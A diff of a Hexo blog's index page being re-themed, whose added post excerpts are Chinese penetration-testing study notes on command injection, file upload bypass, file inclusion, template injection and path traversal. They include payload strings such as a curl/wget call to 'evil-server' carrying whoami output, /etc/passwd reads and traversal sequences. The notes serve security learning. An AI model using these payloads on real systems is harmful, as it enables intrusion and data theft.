@@ -1,328 +1,428 @@
-<!DOCTYPE html>
-<html lang=en>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="{&quot;start_year&quot;:2016,&quot;end_year&quot;:null}"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-    
-    
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/page/2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Hexo',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-12-28 00:22:27'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
       
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
+        get: key => {
+          const itemStr = localStorage.getItem(key)
       
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
       
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
       
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-    <!-- title -->
-    <title>Hexo</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Hexo</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E4%B8%BB%E5%8A%A8%E6%89%93%E7%82%B9%E5%92%8C%E8%A2%AB%E5%8A%A8%E6%89%93%E7%82%B9/" title="主动打点和被动打点">主动打点和被动打点</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></span></div><div class="content">主动打点和被动打点12主动式信息打点：主动使用工具、主动发起测试流量等被动式信息打点：调用接口获取信息等
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" title="命令注入">命令注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></span></div><div class="content">命令注入简介命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。
+该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。
+. 常见危险函数PHP
+system
+exec
+passthru
+shell_exec
+popen
+proc_open
 
 
-    <!-- Umami Analytics -->
+Python
+system
+popen
+subprocess.call
+spawn
+
+Java
+java.lang.Runtime.getRuntime().exec(command)
+
+常见注入方式
+分号分割
+|| &amp;&amp; &amp; 分割
+| 管道符
+\r\n %d0%a0 换行
+反引号解析
+$() 替换
+
+无回显技巧
+bash反弹shell
+
+DNS带外数据
 
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-    <div class="content index py4 h-card">
-        
-          <header id="header">
-  <a class="u-url u-uid" href="/">
-  
-    
-      <img id="logo" alt class="u-logo" src="/images/logo.png" />
-    
-  
-    <div id="title">
-      <h1 class="p-name">Hexo</h1>
-    </div>
-  </a>
-  <div id="nav">
-    <ul>
-      <li class="icon">
-        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
-      </li>
-      <!--
-     --><li><a href="/">Home</a></li><!--
-   --><!--
-     --><li><a href="/about/">About</a></li><!--
-   --><!--
-     --><li><a href="/archives/">Writing</a></li><!--
-   --><!--
-     --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
-   -->
-    </ul>
-  </div>
-</header>
-
-        
-        <section id="about" class="p-note">
-  
-  
-    <p>
-      Find me on
-      
-      
-      
-        
-        
-          <a class="icon u-url" target="_blank" rel="noopener me" href="http://github.com/probberechts/cactus-dark" aria-label="github" title="github">
-            <i class="fa-brands fa-github"></i><!--
-      ---></a><!--
-    ---><!--
-    --->, 
-        
-      
-        
-        
-          <a class="icon u-url" target="_blank" rel="noopener me" href="/" aria-label="twitter" title="twitter">
-            <i class="fa-brands fa-twitter"></i><!--
-      ---></a><!--
-    ---><!--
-    --->, 
-        
-      
-        
-        
-          <a class="icon u-url" target="_blank" rel="noopener me" href="/" aria-label="facebook" title="facebook">
-            <i class="fa-brands fa-facebook"></i><!--
-      ---></a><!--
-    ---><!--
-    --->, 
-        
-      
-        
-        
-          <a class="icon u-email" target="_blank" rel="noopener" href="mailto:name@email.com" aria-label="mail" title="mail">
-            <i class="fa-solid fa-envelope"></i><!--
-      ---></a>
-        <!--
-    --->, 
-        
-      
-        
-        
-          <a class="icon u-url" target="_blank" rel="noopener me" href="https://mastodon.social/@alice" aria-label="mastodon.social" title="mastodon.social">
-            <i class="fa-brands fa-mastodon"></i><!--
-      ---></a><!--
-    ---><!--
-    ---> and 
-        
-      
-        
-        
-          <a class="icon u-url" target="_blank" rel="noopener me" href="https://fosstodon.org/@alice" aria-label="fosstodon.org" title="fosstodon.org">
-            <i class="fa-brands fa-mastodon"></i><!--
-      ---></a><!--
-    ---><!--
-    --->.
-        
-      
-    </p>
-  
-</section>
-
-<section id="writing">
-  <span class="h1"><a href="/archives/">Writing</a></span>
-  
-  <ul class="post-list">
-    
-    
-      
-    
-    
-      <li class="post-item">
-        
-    <div class="meta">
-      
-        
-          <time datetime="2023-12-25T18:01:50.000Z" class="dt-published" itemprop="datePublished">2023-12-26</time>
-        
-      
-    </div>
-
-
-        <span>
-    
-        <a class="" href="/2023/12/26/csrf/">csrf</a>
-    
-
-
-</span>
-      </li>
-    
-      <li class="post-item">
-        
-    <div class="meta">
-      
-        
-          <time datetime="2023-12-25T18:01:50.000Z" class="dt-published" itemprop="datePublished">2023-12-26</time>
-        
-      
-    </div>
-
-
-        <span>
-    
-        <a class="" href="/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">http请求走私</a>
-    
-
-
-</span>
-      </li>
-    
-      <li class="post-item">
-        
-    <div class="meta">
-      
-        
-          <time datetime="2023-12-25T18:01:50.000Z" class="dt-published" itemprop="datePublished">2023-12-26</time>
-        
-      
-    </div>
-
-
-        <span>
-    
-        <a class="" href="/2023/12/26/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3%E7%AC%94%E8%AE%B0/">sql注入</a>
-    
-
-
-</span>
-      </li>
-    
-      <li class="post-item">
-        
-    <div class="meta">
-      
-        
-          <time datetime="2023-12-25T18:01:50.000Z" class="dt-published" itemprop="datePublished">2023-12-26</time>
-        
-      
-    </div>
-
-
-        <span>
-    
-        <a class="" href="/2023/12/26/ssrf/">ssrf</a>
-    
-
-
-</span>
-      </li>
-    
-      <li class="post-item">
-        
-    <div class="meta">
-      
-        
-          <time datetime="2023-12-25T18:01:50.000Z" class="dt-published" itemprop="datePublished">2023-12-26</time>
-        
-      
-    </div>
-
-
-        <span>
-    
-        <a class="" href="/2023/12/26/web%20cahe%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/">webcache欺骗攻击</a>
-    
-
-
-</span>
-      </li>
-    
-  </ul>
-  
-</section>
+http带外
+curl http://evil-server/$(whoami)``wget http://evil-server/$(whoami ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">文件上传</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></span></div><div class="content">文件上传文件类型检测绕过更改请求绕过有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。 同样的，有的站点在后端仅检查了HTTP Header中的信息，比如 Content-Type 等，这种检查同样可以通过修改网络请求绕过。
+Magic检测绕过有的站点使用文件头来检测文件类型，这种检查可以在Shell前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示
 
 
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2016-2023
-    John Doe
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
+类型
+二进制值
 
 
 
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+JPG
+FF D8 FF E0 00 10 4A 46 49 46
 
 
-    <!-- jquery -->
+GIF
+47 49 46 38 39 61
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+PNG
+89 50 4E 47
+
+
+TIF
+49 49 2A 00
+
+
+BMP
+42 4D
+
+
+后缀绕过部分服务仅根据后缀、上传时的信息或Magic Header来判断文件类型，此时可以绕过。
+php由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php &#x2F; php5 &#x2F; pht &#x2F; phtml &#x2F; shtml &#x2F; pwml &#x2F; phtm 等 可在禁 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">文件包含</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></span></div><div class="content">文件包含[TOC]
+基础常见的文件包含漏洞的形式为 &lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;]); ?&gt;
+考虑常用的几种包含方式为
+
+同目录包含 file=.htaccess
+目录遍历 ?file=../../../../../../../../../var/lib/locate.db
+日志注入 ?file=../../../../../../../../../var/log/apache/error.log
+利用 /proc/self/environ
+
+其中日志可以使用SSH日志或者Web日志等多种日志来源测试
+触发SinkPHP
+
+
+include
+在包含过程中出错会报错，不影响执行后续语句
 
 
 
 
-<!-- clipboard -->
+include_once
+仅包含一次
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
 
-<!-- Baidu Analytics -->
+require
+在包含过程中出错，就会直接退出，不执行后续语句
 
-<!-- Cloudflare Analytics -->
 
-<!-- Disqus Comments -->
 
-<!-- utterances Comments -->
+require_once
 
-</body>
-</html>
+
+绕过技巧常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式
+url编码绕过如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过
+ ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="模板注入">模板注入</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></span></div><div class="content">模版注入简介模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。
+测试方法
+确定使用的引擎
+查看引擎相关的文档，确定其安全机制以及自带的函数和变量
+需找攻击面，尝试攻击
+
+测试用例
+简单的数学表达式，&#123;&#123; 7+7 &#125;&#125; =&gt; 14
+
+字符串表达式 &#123;&#123; "ajin" &#125;&#125; =&gt; ajin
+
+
+Ruby
+&lt;%= 7 * 7 %&gt;``&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt;
+
+
+
+
+Java
+$&#123;7*7&#125;
+
+
+
+
+Twig
+&#123;&#123;7*7&#125;&#125;
+
+
+
+
+Smarty
+&#123;php&#125;echo id;& ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/" title="目录穿越">目录穿越</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></span></div><div class="content">目录穿越
+
+[TOC]
+目录穿越简介目录穿越（也被称为目录遍历&#x2F;directory traversal&#x2F;path traversal）是通过使用 ../ 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。
+攻击载荷URL参数
+../
+..\
+..;/
+
+Nginx Off by Slash
+https://vuln.site.com/files../
+
+UNC Bypass
+\\localhost\c$\windows\win.ini
+
+过滤绕过
+
+单次替换
+...//
+
+
+
+URL编码
+
+
+16位Unicode编码
+\u002e
+
+
+
+
+超长UTF-8编码
+\%e0%40%ae
+
+
+
+
+防御在进行文件操作相关的API前，应该对用户输入做过滤。较强的规则下可以使用白名单，仅允许纯字母或数字字符等。
+若规则允许的字符较多，最好使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用。
+</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="逻辑漏洞/业务漏洞">逻辑漏洞/业务漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></span></div><div class="content">逻辑漏洞 &#x2F; 业务漏洞简介逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。
+在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。
+安装逻辑
+查看能否绕过判定重新安装
+查看能否利用安装文件获取信息
+看能否利用更新功能获取信息
+
+交易购买
+修改支付的价格
+修改支付的状态
+修改购买数量为负数
+修改金额为负数
+重放成功的请求
+并发数据库锁处理不当
+
+业务风控
+刷优惠券
+套现
+
+账户注册
+覆盖注册
+尝试重复用户名
+注册遍历猜解已有账号
+
+密码
+密码未使用哈希算法保存
+没有验证用户设置密码的强度
+
+邮箱用户名
+前后空格
+大小写变换
+
+Cookie
+包含敏感信息
+未验证合法性可伪造
+
+手机号用户名
+前后空格
++86
+
+登录
+
+撞库
+设置异地登录检查等机制
+
+
+
+账号劫持
+
+
+恶意尝试帐号密码锁死账户
+需要设置锁定机制与解锁机制
+
+
+
+不安全的传输信道
+
+登录凭证存储在不安全的位置
+
+
+找回密码
+重置任意用户密码
+密码重置后新密码在返回包中
+Token验证逻辑在前端
+X-Forwarded-Host处理不正确
+找回密码 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/" title="配置与安全">配置与安全</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></span></div><div class="content">配置与策略安全认证策略密码策略
+未限制密码最低位数
+
+未限制密码必须包含字符集
+
+为常用密码
+
+
+个人信息相关
+手机号生日姓名用户名
+
+
+
+
+未检测常见弱密码
+已泄露的常用密码键盘模式
+
+
+
+
+加密实现
+在客户端存储私钥
+
+权限配置
+运维人员权限粒度过大
+客服人员权限粒度过大
+
+供应链安全三方认证
+利用被攻击的第三方服务账号登录其他平台账号
+
+三方库&#x2F;软件
+公开漏洞后没有及时更新
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93/" title="判断数据库">判断数据库</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T18:01:02.000Z" title="Created 2023-12-26 02:01:02">2023-12-26</time></span></div><div class="content">数据库判定​	端口扫描
+1234567mysql 3306oracle 1521sql server 1433db2 5000
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info"><a class="article-title" href="/2023/12/26/%E5%88%A4%E6%96%AD%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" title="判断操作系统">判断操作系统</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-12-25T17:59:56.000Z" title="Created 2023-12-26 01:59:56">2023-12-26</time></span></div><div class="content">判断操作系统ttl123456WINDOWS NT/2000   TTL：128WINDOWS 95/98     TTL：32UNIX              TTL：255LINUX             TTL：64WIN7          	  TTL：64
+
+nmap使用技术可以具体了解判定方法
+</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/#content-inner">5</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2023/12/26/csrf/" title="csrf">csrf</a><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="http请求走私">http请求走私</a><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2023/12/26/ssrf/" title="ssrf">ssrf</a><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2023/12/26/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3%E7%AC%94%E8%AE%B0/" title="sql注入">sql注入</a><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2023/12/26/web%20cahe%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/" title="webcache欺骗攻击">webcache欺骗攻击</a><time datetime="2023-12-25T18:01:50.000Z" title="Created 2023-12-26 02:01:50">2023-12-26</time></div></div></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">December 2023</span><span class="card-archive-list-count">32</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">November 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">December 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/11/"><span class="card-archive-list-date">November 2022</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/12/"><span class="card-archive-list-date">December 2020</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/11/"><span class="card-archive-list-date">November 2020</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article :</div><div class="item-count">41</div></div><div class="webinfo-item"><div class="item-name">UV :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">PV :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Update :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-12-27T16:22:26.941Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
